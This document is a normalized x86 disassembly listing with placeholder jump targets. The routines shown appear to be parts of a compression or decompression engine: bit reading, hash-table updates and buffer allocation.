mov [ eax ] ebx
pop esi
mov eax 0xffffff37
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0xc ]
jae r-xdata
mov eax [ ebp + 0x14 ]
mov edx [ ebp - 0x4 ]
pop edi
pop esi
mov [ eax ] edx
mov eax 0xffffff37
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx 0x1000002
ja r-xdata
lea ebx [ edx + ebx * 2 ]
cmp eax [ ebp + 0xc ]
jae r-xdata
mov ecx [ ebp + 0x14 ]
pop edi
pop esi
mov [ ecx ] ebx
mov eax 0xffffff36
pop ebx
mov esp ebp
pop ebp
retn
mov dl [ eax + edi ]
mov edi [ ebp + 0x10 ]
mov [ ebx + edi ] dl
mov edi [ ebp + 0x8 ]
inc ebx
inc eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
pop edi
pop esi
mov [ edx ] ecx
mov eax 0xffffff35
pop ebx
mov esp ebp
pop ebp
retn
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] ebx
test ecx ecx
je r-xdata
mov esi [ eax + edi ]
mov edx esi
add eax 0x4
mov ecx 0x1f
shr edx 0x1f
dec ecx
mov edx esi
shr edx cl
and edx 0x1
jmp r-xdata
test ecx ecx
je r-xdata
cmp ebx 0x2
jne r-xdata
test edx edx
je r-xdata
cmp eax [ ebp + 0xc ]
jae r-xdata
mov edx [ ebp - 0x14 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x14 ]
pop edi
pop esi
mov [ ecx ] eax
mov eax 0xffffff37
pop ebx
mov esp ebp
pop ebp
retn
movzx edx [ eax + edi ]
add ebx 0xfffffffd
shl ebx 0x8
add edx ebx
inc eax
cmp edx 0xffffffff
je r-xdata
mov [ ebp - 0x10 ] edx
test ecx ecx
je r-xdata
mov ecx [ ebp + 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ ecx ] edx
mov ecx [ ebp + 0xc ]
cmp eax ecx
jne r-xdata
inc edx
mov [ ebp - 0x14 ] edx
mov esi [ eax + edi ]
mov ecx 0x1f
dec ecx
mov edx esi
shr edx cl
mov ebx esi
add eax 0x4
shr ebx 0x1f
and edx 0x1
jmp r-xdata
dec ecx
mov ebx esi
shr ebx cl
and ebx 0x1
test ecx ecx
je r-xdata
sbb eax eax
pop edi
and eax 0xfffffffc
pop esi
add eax 0xffffff37
pop ebx
mov esp ebp
pop ebp
retn
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ edx + ebx * 2 ]
test edx edx
jne r-xdata
mov esi [ eax + edi ]
mov edx esi
add eax 0x4
mov ecx 0x1f
shr edx 0x1f
dec ecx
mov edx esi
shr edx cl
and edx 0x1
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ebx 0xd00
cmp ebx edi
sbb ebx ebx
neg ebx
add edx ebx
mov ebx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] edx
add edx ebx
cmp edx [ ebp - 0xc ]
ja r-xdata
lea ebx [ edx + 0x1 ]
jmp r-xdata
mov eax [ ebp + 0x14 ]
pop edi
mov [ eax ] ebx
pop esi
mov eax 0xffffff36
pop ebx
mov esp ebp
pop ebp
retn
cmp edi ebx
ja r-xdata
test ecx ecx
je r-xdata
mov ecx [ ebp + 0x14 ]
pop edi
pop esi
mov [ ecx ] ebx
mov eax 0xffffff35
pop ebx
mov esp ebp
pop ebp
retn
mov edi ebx
sub edi [ ebp - 0x10 ]
inc ebx
add edi [ ebp + 0x10 ]
mov dl [ edi ]
mov [ ebp - 0x4 ] edi
mov edi [ ebp + 0x10 ]
inc [ ebp - 0x4 ]
mov [ ebx + edi - 0x1 ] dl
jmp r-xdata
mov esi [ eax + edi ]
mov edx esi
add eax 0x4
mov ecx 0x1f
shr edx 0x1f
dec ecx
mov edx esi
shr edx cl
and edx 0x1
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov dl [ edx ]
inc [ ebp - 0x4 ]
mov [ ebx + edi ] dl
inc ebx
dec [ ebp - 0x8 ]
jne r-xdata
cmp edx [ ebp - 0xc ]
jae r-xdata
lea edx [ edx + ebx * 2 ]
mov [ ebp - 0x8 ] edx
cmp eax [ ebp + 0xc ]
jae r-xdata
mov edi [ ebp + 0x8 ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
pop edi
pop esi
mov [ edx ] ecx
mov eax 0xffffff36
pop ebx
mov esp ebp
pop ebp
retn
test ecx ecx
je r-xdata
mov esi [ eax + edi ]
mov edx esi
add eax 0x4
mov ecx 0x1f
shr edx 0x1f
dec ecx
mov edx esi
shr edx cl
and edx 0x1
jmp r-xdata
mov ebx [ ebp - 0x8 ]
add [ ebp - 0x8 ] 0x2
mov edx [ ebp - 0x8 ]
test edx edx
je r-xdata
sub_403190
push ebp
mov ebp esp
sub esp 0xc
mov edx [ ebp + 0xc ]
mov edx [ edx ]
push ebx
mov ebx [ ebp + 0x8 ]
add ebx eax
push esi
xor esi esi
xor ecx ecx
mov [ ebp - 0x4 ] esi
mov [ ebp - 0xc ] 0x1
mov [ ebp - 0x8 ] edx
mov [ ebp + 0x8 ] ebx
cmp edx ebx
jb r-xdata
test cl 0x7f
je r-xdata
mov eax [ ebp + 0xc ]
pop esi
mov [ eax ] ecx
mov eax 0xffffff32
pop ebx
mov esp ebp
pop ebp
retn
movzx ecx [ eax + edi ]
lea ecx [ ecx + ecx + 0x1 ]
inc eax
add ecx ecx
jmp r-xdata
mov edx 0x1
mov edi edi
cmp eax ebx
jae r-xdata
test ecx 0x100
je r-xdata
movzx ecx [ eax + edi ]
lea ecx [ ecx + ecx + 0x1 ]
inc eax
add ecx ecx
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] esi
pop esi
mov eax 0xffffff37
pop ebx
mov esp ebp
pop ebp
retn
cmp esi edx
jae r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
pop esi
mov [ edx ] ecx
mov eax 0xffffff37
pop ebx
mov esp ebp
pop ebp
retn
cmp edx 0x1000002
ja r-xdata
mov esi ecx
shr esi 0x8
and esi 0x1
lea edx [ esi + edx * 2 ]
cmp eax ebx
jae r-xdata
mov edx [ ebp + 0xc ]
mov [ edx ] esi
pop esi
mov eax 0xffffff36
pop ebx
mov esp ebp
pop ebp
retn
cmp esi eax
ja r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
pop esi
mov [ ecx ] eax
mov eax 0xffffff35
pop ebx
mov esp ebp
pop ebp
retn
test cl 0x7f
je r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] esi
pop esi
mov eax 0xffffff32
pop ebx
mov esp ebp
pop ebp
retn
inc esi
mov [ ebp - 0x4 ] esi
inc eax
jmp r-xdata
movzx ecx [ eax + edi ]
lea ecx [ ecx + ecx + 0x1 ]
inc eax
add ecx ecx
jmp r-xdata
test cl 0x7f
je r-xdata
cmp edx 0x2
jne r-xdata
test ecx 0x100
je r-xdata
cmp eax ebx
jae r-xdata
mov esi [ ebp - 0xc ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x4 ]
pop esi
mov [ eax ] edx
mov eax 0xffffff37
pop ebx
mov esp ebp
pop ebp
retn
movzx esi [ eax + edi ]
add edx 0xfffffffd
shl edx 0x8
add esi edx
inc eax
cmp esi 0xffffffff
je r-xdata
test cl 0x7f
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
mov [ edx ] ecx
cmp eax ebx
jne r-xdata
inc esi
mov [ ebp - 0xc ] esi
movzx ecx [ eax + edi ]
lea ecx [ ecx + ecx + 0x1 ]
inc eax
add ecx ecx
jmp r-xdata
sbb eax eax
and eax 0xfffffffc
pop esi
add eax 0xffffff37
pop ebx
mov esp ebp
pop ebp
retn
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
movzx ecx [ eax + edi ]
lea ecx [ ecx + ecx + 0x1 ]
inc eax
add ecx ecx
jmp r-xdata
mov edx ecx
shr edx 0x8
and edx 0x1
test cl 0x7f
je r-xdata
mov ebx 0xd00
cmp ebx esi
sbb ebx ebx
neg ebx
add edx ebx
add edx [ ebp - 0x4 ]
cmp edx [ ebp - 0x8 ]
ja r-xdata
mov edx 0x1
mov ebx ecx
shr ebx 0x8
and ebx 0x1
lea edx [ ebx + edx * 2 ]
test edx edx
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
pop esi
mov [ edx ] ecx
mov eax 0xffffff36
pop ebx
mov esp ebp
pop ebp
retn
mov ebx [ ebp - 0x4 ]
cmp esi ebx
ja r-xdata
movzx ecx [ eax + edi ]
lea ecx [ ecx + ecx + 0x1 ]
inc eax
add ecx ecx
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] ebx
pop esi
mov eax 0xffffff35
pop ebx
mov esp ebp
pop ebp
retn
inc edx
mov [ ebp - 0x4 ] edx
cmp edx eax
ja r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
pop esi
mov [ ecx ] eax
mov eax 0xffffff37
pop ebx
mov esp ebp
pop ebp
retn
cmp edx [ ebp - 0x8 ]
jae r-xdata
mov ebx ecx
shr ebx 0x8
and ebx 0x1
lea edx [ ebx + edx * 2 ]
cmp eax [ ebp + 0x8 ]
jae r-xdata
mov ecx [ ebp + 0xc ]
pop esi
mov [ ecx ] edx
mov eax 0xffffff32
pop ebx
mov esp ebp
pop ebp
retn
mov ebx [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x4 ]
pop esi
mov [ eax ] edx
mov eax 0xffffff36
pop ebx
mov esp ebp
pop ebp
retn
test cl 0x7f
je r-xdata
movzx ecx [ eax + edi ]
lea ecx [ ecx + ecx + 0x1 ]
inc eax
add ecx ecx
jmp r-xdata
test cl 0x7f
je r-xdata
add edx 0x2
test ecx 0x100
je r-xdata
sub_403440
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
mov esi [ ebp + 0xc ]
mov esi [ esi ]
push edi
mov edi [ ebp + 0x8 ]
add edi eax
xor ecx ecx
xor ebx ebx
mov [ ebp - 0xc ] 0x1
mov [ ebp - 0x4 ] esi
mov [ ebp + 0x8 ] edi
cmp esi edi
jb r-xdata
add ecx ecx
test cx cx
jne r-xdata
mov eax [ ebp + 0xc ]
pop edi
pop esi
mov [ eax ] ecx
mov eax 0xffffff32
pop ebx
mov esp ebp
pop ebp
retn
mov esi ecx
shr esi 0x10
and esi 0x1
test esi esi
je r-xdata
movzx ecx [ eax + edx + 0x1 ]
movzx esi [ eax + edx ]
add eax 0x2
shl ecx 0x8
add ecx esi
lea ecx [ ecx + ecx + 0x1 ]
mov edi 0x1
lea ebx [ ebx ]
cmp eax edi
jae r-xdata
mov ecx esi
shr ecx 0x10
and ecx 0x1
lea edi [ ecx + edi * 2 ]
cmp eax [ ebp + 0x8 ]
jae r-xdata
movzx esi [ eax + edx + 0x1 ]
movzx ecx [ eax + edx ]
add eax 0x2
shl esi 0x8
add esi ecx
lea esi [ esi + esi + 0x1 ]
mov edx [ ebp + 0xc ]
pop edi
pop esi
mov [ edx ] ebx
mov eax 0xffffff37
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x4 ]
jae r-xdata
cmp edi 0x1000002
ja r-xdata
mov eax [ ebp + 0xc ]
pop edi
mov [ eax ] ebx
pop esi
mov eax 0xffffff36
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx eax
ja r-xdata
mov eax [ ebp + 0xc ]
pop edi
mov [ eax ] ebx
pop esi
mov eax 0xffffff35
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ esi + esi ]
test cx cx
jne r-xdata
mov ecx [ ebp + 0xc ]
pop edi
pop esi
mov [ ecx ] ebx
mov eax 0xffffff32
pop ebx
mov esp ebp
pop ebp
retn
inc ebx
inc eax
jmp r-xdata
mov esi ecx
shr esi 0x10
and esi 0x1
test esi esi
je r-xdata
movzx ecx [ eax + edx + 0x1 ]
movzx esi [ eax + edx ]
add eax 0x2
shl ecx 0x8
add ecx esi
lea ecx [ ecx + ecx + 0x1 ]
lea esi [ ecx + ecx ]
test si si
jne r-xdata
cmp edi 0x2
jne r-xdata
cmp eax [ ebp + 0x8 ]
jae r-xdata
mov esi [ ebp - 0xc ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
pop edi
pop esi
mov [ ecx ] ebx
mov eax 0xffffff37
pop ebx
mov esp ebp
pop ebp
retn
movzx esi [ eax + edx ]
add edi 0xfffffffd
shl edi 0x8
add esi edi
inc eax
cmp esi 0xffffffff
je r-xdata
add ecx ecx
mov [ ebp - 0x8 ] esi
test cx cx
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ edx ] ebx
cmp eax ecx
jne r-xdata
inc esi
mov [ ebp - 0xc ] esi
mov edi ecx
shr edi 0x10
add ecx ecx
and edi 0x1
test cx cx
jne r-xdata
movzx ecx [ eax + edx + 0x1 ]
movzx esi [ eax + edx ]
add eax 0x2
shl ecx 0x8
add ecx esi
lea ecx [ ecx + ecx + 0x1 ]
sbb eax eax
pop edi
and eax 0xfffffffc
pop esi
add eax 0xffffff37
pop ebx
mov esp ebp
pop ebp
retn
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov esi ecx
shr esi 0x10
and esi 0x1
lea edi [ esi + edi * 2 ]
test edi edi
jne r-xdata
movzx ecx [ eax + edx + 0x1 ]
movzx esi [ eax + edx ]
add eax 0x2
shl ecx 0x8
add ecx esi
lea ecx [ ecx + ecx + 0x1 ]
mov esi 0xd00
cmp esi [ ebp - 0x8 ]
sbb esi esi
neg esi
add esi edi
add esi ebx
cmp esi [ ebp - 0x4 ]
ja r-xdata
mov edi 0x1
lea ebx [ ebx ]
mov edx [ ebp + 0xc ]
pop edi
pop esi
mov [ edx ] ebx
mov eax 0xffffff36
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x8 ] ebx
ja r-xdata
mov ecx esi
shr ecx 0x10
and ecx 0x1
lea edi [ ecx + edi * 2 ]
cmp eax [ ebp + 0x8 ]
jae r-xdata
movzx esi [ eax + edx + 0x1 ]
movzx ecx [ eax + edx ]
add eax 0x2
shl esi 0x8
add esi ecx
lea esi [ esi + esi + 0x1 ]
lea ebx [ esi + 0x1 ]
cmp ebx eax
ja r-xdata
mov eax [ ebp + 0xc ]
pop edi
mov [ eax ] ebx
pop esi
mov eax 0xffffff37
pop ebx
mov esp ebp
pop ebp
retn
cmp edi [ ebp - 0x4 ]
jae r-xdata
mov edi [ ebp + 0x8 ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
pop edi
pop esi
mov [ ecx ] ebx
mov eax 0xffffff36
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ esi + esi ]
test cx cx
jne r-xdata
mov esi ecx
shr esi 0x10
and esi 0x1
test esi esi
je r-xdata
movzx ecx [ eax + edx + 0x1 ]
movzx esi [ eax + edx ]
add eax 0x2
shl ecx 0x8
add ecx esi
lea ecx [ ecx + ecx + 0x1 ]
lea esi [ ecx + ecx ]
test si si
jne r-xdata
add edi 0x2
sub_403710
push ebp
mov ebp esp
sub esp 0x10
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ esi ]
mov esi [ ebp + 0x8 ]
add esi edx
xor eax eax
xor ecx ecx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x10 ] 0x1
mov [ ebp - 0xc ] edi
mov [ ebp + 0x8 ] esi
cmp edi esi
jb r-xdata
test ecx ecx
je r-xdata
mov eax [ ebp + 0xc ]
pop edi
mov [ eax ] ecx
mov eax 0xffffff32
pop esi
mov esp ebp
pop ebp
retn
mov eax [ edx + ebx ]
mov esi eax
add edx 0x4
mov ecx 0x1f
shr esi 0x1f
dec ecx
mov esi eax
shr esi cl
and esi 0x1
jmp r-xdata
mov edi 0x1
lea ebx [ ebx ]
cmp edx [ ebp + 0x8 ]
jae r-xdata
test esi esi
je r-xdata
mov eax [ edx + ebx ]
mov esi eax
add edx 0x4
mov ecx 0x1f
shr esi 0x1f
dec ecx
mov esi eax
shr esi cl
and esi 0x1
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
pop edi
mov [ edx ] ecx
mov eax 0xffffff37
pop esi
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x4 ]
cmp esi edi
jae r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x4 ]
pop edi
mov [ eax ] edx
mov eax 0xffffff37
pop esi
mov esp ebp
pop ebp
retn
cmp edi 0x1000002
ja r-xdata
lea edi [ esi + edi * 2 ]
cmp edx [ ebp + 0x8 ]
jae r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] esi
pop edi
mov eax 0xffffff36
pop esi
mov esp ebp
pop ebp
retn
cmp esi edx
ja r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
pop edi
mov [ edx ] ecx
mov eax 0xffffff35
pop esi
mov esp ebp
pop ebp
retn
test ecx ecx
je r-xdata
mov ecx [ ebp + 0xc ]
pop edi
mov [ ecx ] esi
mov eax 0xffffff32
pop esi
mov esp ebp
pop ebp
retn
inc esi
mov [ ebp - 0x4 ] esi
inc edx
jmp r-xdata
mov eax [ edx + ebx ]
mov esi eax
add edx 0x4
mov ecx 0x1f
shr esi 0x1f
dec ecx
mov esi eax
shr esi cl
and esi 0x1
jmp r-xdata
test ecx ecx
je r-xdata
cmp edi 0x2
jne r-xdata
test esi esi
je r-xdata
cmp edx [ ebp + 0x8 ]
jae r-xdata
mov esi [ ebp - 0x10 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
pop edi
mov [ ecx ] eax
mov eax 0xffffff37
pop esi
mov esp ebp
pop ebp
retn
movzx esi [ edx + ebx ]
add edi 0xfffffffd
shl edi 0x8
add esi edi
inc edx
cmp esi 0xffffffff
je r-xdata
mov [ ebp - 0x8 ] esi
test ecx ecx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov eax [ ebp + 0x8 ]
cmp edx eax
jne r-xdata
inc esi
mov [ ebp - 0x10 ] esi
mov eax [ edx + ebx ]
mov ecx 0x1f
dec ecx
mov esi eax
shr esi cl
mov edi eax
add edx 0x4
shr edi 0x1f
and esi 0x1
jmp r-xdata
dec ecx
mov edi eax
shr edi cl
and edi 0x1
test ecx ecx
je r-xdata
sbb eax eax
and eax 0xfffffffc
pop edi
add eax 0xffffff37
pop esi
mov esp ebp
pop ebp
retn
pop edi
xor eax eax
pop esi
mov esp ebp
pop ebp
retn
lea edi [ esi + edi * 2 ]
test edi edi
jne r-xdata
mov eax [ edx + ebx ]
mov esi eax
add edx 0x4
mov ecx 0x1f
shr esi 0x1f
dec ecx
mov esi eax
shr esi cl
and esi 0x1
jmp r-xdata
mov esi 0xd00
cmp esi [ ebp - 0x8 ]
sbb esi esi
neg esi
add edi esi
mov esi [ ebp - 0x4 ]
add esi edi
cmp esi [ ebp - 0xc ]
ja r-xdata
mov edi 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
pop edi
mov [ ecx ] eax
mov eax 0xffffff36
pop esi
mov esp ebp
pop ebp
retn
mov edi [ ebp - 0x4 ]
cmp [ ebp - 0x8 ] edi
ja r-xdata
mov eax [ edx + ebx ]
mov esi eax
add edx 0x4
mov ecx 0x1f
shr esi 0x1f
dec ecx
mov esi eax
shr esi cl
and esi 0x1
jmp r-xdata
mov edx [ ebp + 0xc ]
mov [ edx ] edi
pop edi
mov eax 0xffffff35
pop esi
mov esp ebp
pop ebp
retn
inc esi
mov [ ebp - 0x4 ] esi
cmp esi edx
ja r-xdata
cmp edi [ ebp - 0xc ]
jae r-xdata
lea edi [ esi + edi * 2 ]
cmp edx [ ebp + 0x8 ]
jae r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] esi
pop edi
mov eax 0xffffff32
pop esi
mov esp ebp
pop ebp
retn
mov edi [ ebp - 0xc ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
pop edi
mov [ edx ] ecx
mov eax 0xffffff36
pop esi
mov esp ebp
pop ebp
retn
test ecx ecx
je r-xdata
mov eax [ edx + ebx ]
mov esi eax
add edx 0x4
mov ecx 0x1f
shr esi 0x1f
dec ecx
mov esi eax
shr esi cl
and esi 0x1
jmp r-xdata
test ecx ecx
je r-xdata
add edi 0x2
test esi esi
je r-xdata
sub_403a00
push ebp
mov ebp esp
mov edx [ eax ]
sub esp 0x10
push ebx
mov ebx [ ebp + 0x8 ]
xor ecx ecx
sub edx ebx
mov [ eax + 0x58 ] edx
mov [ eax + 0x5c ] ecx
cmp ebx ecx
jbe r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ eax + 0x64 ]
mov [ ebp - 0x4 ] edx
mov edx [ eax + 0x4 ]
inc edx
mov [ ebp - 0x8 ] edx
mov edx [ eax + 0x70 ]
push esi
mov esi [ eax + 0x6c ]
mov [ ebp - 0xc ] edx
mov edx [ eax + 0x74 ]
push edi
mov edi [ eax + 0x68 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x60 ]
sub edi esi
movzx eax [ edx + ecx + 0x1 ]
dec ebx
mov [ ebp + 0x8 ] ebx
movzx ebx [ edx + ecx ]
shl ebx 0x5
xor eax ebx
movzx ebx [ edx + ecx + 0x2 ]
shl eax 0x5
xor eax ebx
mov ebx [ ebp - 0x4 ]
imul eax eax 0x9f5f
shr eax 0x5
and eax 0xffff
mov ebx [ ebx + eax * 4 ]
mov [ edi + esi ] ebx
mov ebx [ ebp - 0x4 ]
mov [ ebx + eax * 4 ] ecx
mov ebx [ ebp - 0x8 ]
mov [ esi ] ebx
mov ebx [ ebp - 0xc ]
inc [ ebx + eax * 4 ]
movzx eax [ edx + ecx ]
mov ebx [ ebp - 0x10 ]
mov [ ebx + eax * 4 ] ecx
mov ebx [ ebp + 0x8 ]
inc ecx
add esi 0x4
test ebx ebx
jne r-xdata
pop edi
pop esi
sub_403ab0
push ebp
mov ebp esp
sub esp 0x8
push edi
xor edi edi
mov [ esi + 0x60 ] edi
mov [ esi + 0x64 ] edi
mov [ esi + 0x68 ] edi
mov [ esi + 0x6c ] edi
mov [ esi + 0x70 ] edi
mov [ esi + 0x74 ] edi
cmp [ esi ] edi
jne r-xdata
cmp [ esi + 0x4 ] edi
jne r-xdata
mov [ esi ] 0x800000
mov ecx [ esi ]
mov [ esi + 0x8 ] 0x1
cmp ecx 0x800000
ja r-xdata
mov [ esi + 0x4 ] 0x800
mov eax 0xfffffffe
pop edi
mov esp ebp
pop ebp
retn
mov eax [ esi + 0x4 ]
cmp eax 0x800
ja r-xdata
lea eax [ ecx + eax * 2 ]
cmp eax edi
ja r-xdata
push eax
call [ rwxdata ]
add esp 0x4
xor eax eax
jmp r-xdata
xor eax eax
xor edx edx
mov eax ebx
div ecx
cmp eax 0x4
jne r-xdata
push ebx
push 0x40000
mov [ esi + 0x60 ] eax
call [ rwxdata ]
mov ecx [ esi + 0x4 ]
add esp 0x4
add ecx [ esi ]
mov [ esi + 0x64 ] eax
lea ebx [ ecx * 4 ]
je r-xdata
xor eax eax
xor edx edx
mov eax ebx
div ecx
cmp eax 0x4
jne r-xdata
cmp ebx edi
jbe r-xdata
pop ebx
mov eax 0xfffffffd
pop edi
mov esp ebp
pop ebp
retn
cmp [ esi + 0x64 ] edi
je r-xdata
cmp ebx edi
jbe r-xdata
push ebx
call [ rwxdata ]
add esp 0x4
jmp r-xdata
cmp [ esi + 0x68 ] edi
je r-xdata
push ebx
call [ rwxdata ]
add esp 0x4
jmp r-xdata
mov ecx [ esi + 0x4 ]
add ecx [ esi ]
mov [ esi + 0x68 ] eax
lea ebx [ ecx * 4 ]
je r-xdata
cmp [ esi + 0x6c ] edi
je r-xdata
push 0x40000
mov [ esi + 0x6c ] eax
call [ rwxdata ]
add esp 0x4
mov [ esi + 0x70 ] eax
cmp [ esi + 0x60 ] edi
je r-xdata
cmp eax edi
je r-xdata
push 0x40000
call [ rwxdata ]
add esp 0x4
mov [ ebp - 0x4 ] eax
mov [ esi + 0x74 ] eax
cmp eax edi
je r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ esi ]
lea ebx [ eax + ecx ]
mov [ esi + 0x14 ] eax
add eax ebx
mov [ esi + 0x10 ] 0x800
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
mov [ esi + 0x50 ] ebx
cmp eax 0xffffffff
jb r-xdata
mov eax [ esi + 0x60 ]
push 0x40000
mov [ esi + 0x58 ] ecx
mov ecx [ esi + 0x70 ]
add eax ebx
push edi
push ecx
mov [ esi + 0x54 ] eax
call sub_4105f0
mov edx [ ebp - 0x4 ]
push 0x40000
push 0xff
push edx
call sub_4105f0
mov [ esi + 0x44 ] edi
mov [ esi + 0x3c ] edi
mov [ esi + 0x38 ] edi
mov [ esi + 0x40 ] edi
mov [ esi + 0x48 ] edi
mov [ esi + 0x5c ] edi
mov edi [ esi + 0x30 ]
mov ecx [ edi + 0x1c ]
mov eax [ edi + 0x24 ]
add esp 0x18
sub eax ecx
mov [ esi + 0x28 ] eax
je r-xdata
pop ebx
or eax 0xffffffff
pop edi
mov esp ebp
pop ebp
retn
cmp [ esi + 0x44 ] ebx
jne r-xdata
mov edx [ esi + 0x4 ]
cmp eax edx
jbe r-xdata
mov eax [ esi ]
mov [ esi + 0x4c ] 0x0
test eax eax
jne r-xdata
mov [ esi + 0x44 ] 0x0
mov eax [ esi + 0x28 ]
push eax
mov eax [ esi + 0x60 ]
push ecx
push eax
call sub_411080
mov ecx [ esi + 0x28 ]
mov edx ecx
add esp 0xc
add [ edi + 0x1c ] ecx
mov [ esi + 0x44 ] edx
mov [ esi + 0x28 ] edx
sub ebx eax
mov [ esi + 0x4c ] ebx
pop ebx
xor eax eax
pop edi
mov esp ebp
pop ebp
retn
neg eax
pop ebx
mov [ esi + 0x4c ] eax
xor eax eax
pop edi
mov esp ebp
pop ebp
retn
sub_403cd0
mov eax [ esi + 0x74 ]
push edi
xor edi edi
cmp eax edi
je r-xdata
mov eax [ esi + 0x70 ]
mov [ esi + 0x74 ] edi
cmp eax edi
je r-xdata
push eax
call [ rwxdata ]
add esp 0x4
mov eax [ esi + 0x6c ]
mov [ esi + 0x70 ] edi
cmp eax edi
je r-xdata
push eax
call [ rwxdata ]
add esp 0x4
mov eax [ esi + 0x68 ]
mov [ esi + 0x6c ] edi
cmp eax edi
je r-xdata
push eax
call [ rwxdata ]
add esp 0x4
mov eax [ esi + 0x64 ]
mov [ esi + 0x68 ] edi
cmp eax edi
je r-xdata
push eax
call [ rwxdata ]
add esp 0x4
mov eax [ esi + 0x60 ]
mov [ esi + 0x64 ] edi
cmp eax edi
je r-xdata
push eax
call [ rwxdata ]
add esp 0x4
mov [ esi + 0x60 ] edi
pop edi
retn
push eax
call [ rwxdata ]
add esp 0x4
sub_403d50
mov ecx [ eax + 0x30 ]
mov edx [ ecx + 0x1c ]
push esi
cmp edx [ ecx + 0x24 ]
jae r-xdata
mov ecx [ eax + 0x28 ]
test ecx ecx
je r-xdata
mov esi edx
movzx edx [ esi ]
inc esi
mov [ ecx + 0x1c ] esi
test edx edx
jns r-xdata
mov ecx [ eax + 0x50 ]
mov esi 0x1
add [ eax + 0x44 ] esi
cmp [ eax + 0x44 ] ecx
jne r-xdata
dec ecx
mov [ eax + 0x28 ] ecx
jmp r-xdata
mov ecx [ eax + 0x44 ]
mov esi [ eax + 0x60 ]
mov [ ecx + esi ] dl
cmp ecx [ eax + 0x4 ]
jae r-xdata
add [ eax + 0x48 ] esi
cmp [ eax + 0x48 ] ecx
jne r-xdata
mov [ eax + 0x44 ] 0x0
mov esi [ eax + 0x54 ]
mov [ ecx + esi ] dl
add [ eax + 0x4c ] esi
pop esi
cmp [ eax + 0x4c ] ecx
jne r-xdata
mov [ eax + 0x48 ] 0x0
retn
mov [ eax + 0x4c ] 0x0
sub_403dd0
mov eax [ edx + 0x58 ]
test eax eax
jne r-xdata
dec eax
mov [ edx + 0x58 ] eax
mov ecx [ edx + 0x60 ]
movzx eax [ ecx + esi ]
add ecx esi
shl eax 0x5
push edi
movzx edi [ ecx + 0x1 ]
xor eax edi
movzx edi [ ecx + 0x2 ]
shl eax 0x5
xor eax edi
mov edi [ edx + 0x70 ]
imul eax eax 0x9f5f
shr eax 0x5
and eax 0xffff
dec [ edi + eax * 4 ]
lea eax [ edi + eax * 4 ]
movzx eax [ ecx ]
mov ecx [ edx + 0x74 ]
lea eax [ ecx + eax * 4 ]
pop edi
cmp [ eax ] esi
jne r-xdata
retn
mov [ eax ] 0xffffffff
retn
sub_403e30
push ebp
mov ebp esp
sub esp 0x10
cmp [ ebp + 0x8 ] 0x0
jbe r-xdata
mov esp ebp
pop ebp
retn
mov eax [ edx + 0x4 ]
mov ecx [ edx + 0x48 ]
inc eax
push ebx
mov [ ebp - 0x10 ] eax
mov eax [ edx + 0x58 ]
push esi
mov esi [ edx + 0x60 ]
push edi
mov edi [ edx + 0x4c ]
mov [ ebp - 0x8 ] eax
mov eax [ edx + 0x44 ]
mov [ ebp - 0xc ] edi
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x8 ]
movzx eax [ esi + edi ]
movzx ebx [ esi + edi + 0x1 ]
shl eax 0x5
xor eax ebx
movzx ebx [ esi + edi + 0x2 ]
shl eax 0x5
xor eax ebx
